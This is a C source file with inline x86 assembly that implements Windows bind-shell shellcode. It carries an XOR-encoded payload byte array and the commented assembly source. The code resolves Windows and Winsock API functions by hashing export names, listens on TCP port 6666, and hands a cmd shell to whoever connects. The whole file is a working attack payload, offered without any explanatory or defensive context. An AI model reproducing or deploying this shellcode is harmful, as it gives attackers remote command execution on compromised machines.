char shellcode[] = "\x83\xC0\x14\x33\xC9\x8A\x1C\x01\x80\xF3\x44\x88\x1C\x01\x41\x80\xFB\x90\x75\xF1\xB8\x2C\x2E\x4E\x7C\x5A\x2C\x27\xCD\x95\x0B\x2C\x76\x30\xD5\x48\xCF\xB0\xC9\x3A\xB0\x77\x9F\xF3\x40\x6F\xA7\x22\xFF\x77\x76\x17\x2C\x31\x37\x21\x36\x10\x77\x96\x20\xCF\x1E\x74\xCF\x0F\x48\xCF\x0D\x58\xCF\x4D\xCF\x4D\xCF\x2D\x4C\xE9\x79\x2E\x4E\x7C\x5A\x31\x41\xD1\xBB\x13\xBC\xD1\x24\xCF\x01\x78\xCF\x08\x6C\x3C\x47\x89\xCF\x1D\x64\x47\x99\x77\xBB\x0B\x03\xCF\x70\xFF\x47\xB1\xDD\x4B\xFA\x42\x7C\xA4\x30\x4C\x85\x8E\x43\x47\x94\x02\xAF\xB5\x7F\x10\x60\x58\x31\xA0\xCF\x1D\x60\x47\x99\x22\xCF\x78\x3F\xCF\x1D\x58\x47\x99\x47\x68\xFF\xD1\x1B\xEF\x13\x25\x79\x2E\x4E\x7C\x5A\x31\xEC\x77\x9F\x17\x2C\x33\x21\x37\x30\x2C\x22\x25\x2D\x28\xCF\x80\x17\x14\x14\x17\xBB\x13\xB8\x17\xBB\x13\xBC\xD4\xD4\xD4\xD4";

void main()
{
	__asm
	{
		_emit	059H; LoadLibraryA; pop ecx
			_emit	081H; CreateProcessA; or ecx, 0x203062d3
			_emit	0C9H; ExitProcess
			_emit	0D3H; WSAStartup
			_emit	062H; WSASocketA
			_emit	030H; bind
			_emit	020H; listen
			_emit	041H; accept; inc ecx
			_emit	043H; "CMd"; inc ebx
			_emit	04DH; dec ebp
			_emit	064H; FS:

		; start of proper code
			cdp; set edx = 0  (eax small)
			xchg	eax, esi; esi = addr of first function hash
			lea		edi, [esi - 018H]; edi = addr to start writing function addr with overlapping

			; find base addr of kernel32.dll
			mov		ebx, fs:[edx + 030H]; ebx = addr of PEB
			mov		ecx, [ebx + 0CH]; ecx = ptr to loader data
			mov		ecx, [ecx + 01CH]; ecx = first entry in initialization order list
			mov		ecx, [ecx]
			mov		ecx, [ecx]; ecx = third entry in list(kernel32.dll)
			mov		ebp, [ecx + 08H]; ebp = base addr of kernel32.dll

			; make some stack space
			mov		dh, 03H; sizeof(WSADATA)is 0x190
			sub		esp, edx

			; push a ptr to "ws2_32" onto stack
			mov		dx, 03233H; rest of edx is null
			push	edx
			push	05F327377H
			push	esp

		find_lib_functions :
		lodsb; load next hash into al and increment esi
			cmp		al, 0D3H; hash of WSAStartup, the trigger to LoadLibraryA("ws2_32")
			jne		find_functions
			xchg	eax, ebp; save current hash
			call[edi - 0CH]; LoadLibraryA("ws2_32")
			xchg	eax, ebp; restore current hash, and update ebp with base addr of ws2_32.dll
			push	edi; save location of addr of first winsock function

		find_functions :
		pushad; preserve regs
			mov		eax, [ebp + 03CH]; eax = start of PE header
			mov		ecx, [ebp + eax + 078H]; ecx = relative offset of export table
			add		ecx, ebp; absolute addr of export table
			mov		ebx, [ecx + 020H]; ebx = relative addr of name table
			add		ebx, ebp; ebx = absolute addr of name table
			xor		edi, edi; edi will count through the functions
			dec		edi

		next_function_loop :
		inc		edi; increment function counter
			mov		esi, [ebx + edi * 4]; esi = relative offset of current function name
			add		esi, ebp; esi = absolute addr of current function name
			cdq; dl will hold hash(we know eax is small)

		hash_loop:
		lodsb; load next char into al and increment esi
			xor		al, 071H;
		sub		dl, al
			cmp		al, 071H
			jne		hash_loop
			cmp		dl, [esp + 01CH]; compare to the requested hash(saved on stack from pushad)
			jnz		next_function_loop;

		; we now have the right function
			mov		ebx, [ecx + 024H]; ebx = relative offset of ordinal table
			add		ebx, ebp; ebx = absolute addr of ordinal table
			mov		di, [ebx + edi * 2]; di = ordinal number of matched function
			mov		ebx, [ecx + 01CH]; ebx = relative offset of addr table
			add		ebx, ebp; ebx = absolute addr of addr table
			add		ebp, [ebx + edi * 4]; ebp = absolute addr of the matched function
			xchg	eax, ebp; move func addr into eax
			pop		edi; edi is the last onto stack in pushad
			stosd; write func addr to[edi] and increment edi
			push	edi
			popad; restore regs
			cmp		esi, edi; loop until we reach end of last hash
			jne		find_lib_functions

			; we now have all the functions
			pop		esi; first winsock func addr

			; initialize winsock
			push	esp; use stack for WSADATA
			push	02H; wVersionRequested
			lodsd;
		call	eax; WSAStartup

			; null - terminate "cmd"
			mov		byte ptr[esi + 013H], al; eax = 0 if WSASStartup() worked

			; clear some stack to use as NULL parameters
			lea		ecx, [eax + 030H]; sizeof(STARTUPINFO) = 044H
			mov		edi, esp
			rep		stosd

			; create socket
			inc		eax; eax = 1
			push	eax; type = 1 (SOCK_STREAM)
			inc		eax; eax = 2
			push	eax; af = 2 (AF_INET)
			lodsd
			call	eax; WSASocketA
			xchg	ebp, eax; save SOCKET descriptor in ebp(safe from being changed by remaining API calls)

			; push bind parameters
			mov		eax, 0A1AFF02H; 0x1a0a = port 6666, 0x02 = AF_INET
			xor		ah, ah; eax = 0x0A1A0002
			push	eax; we use 0x0a1a0002 as both the name(struct sockeaddr) and namelen(which only neeed to be large enough)
			push	esp; ptr to our sockaddr struct

			; call bind(), listen() and accept() in turn
		call_loop :
		push	ebp; save SOCKET descriptor
			lodsd;
		call	eax
			test	eax, eax; bind() and listen() return 0, accept() returns a SOCKET descriptor
			jz		call_loop

			; initialize a STARTUPINFO structure at esp
			inc 	byte ptr[esp + 02DH]; set STARTF_USESTDHANDLES to true
			sub		edi, 06CH; point edi at hStdInput in STARTUPINFO
			stosd; use SOCKET descriptor returned by accept(still in eax) as the stdin handle same for stdout
			stosd; same for stdout
			stosd; same for stderr(optional)

			; create process
			pop		eax; eax = 0 (STARTUPINFO now at esp + 4)
			push	esp; use stack as PROCESSINFORMATION structure(STARTUPINFO now back to esp)
			push	esp; STARTUPINFO structure
			push	eax
			push	eax
			push	eax
			push	esp
			push	eax
			push	eax
			push	esi
			push	eax
			call[esi - 01CH]; CreateProcessA

			; call ExitProcess()
			call[esi - 018H]; ExitProcess
	}


	return;
}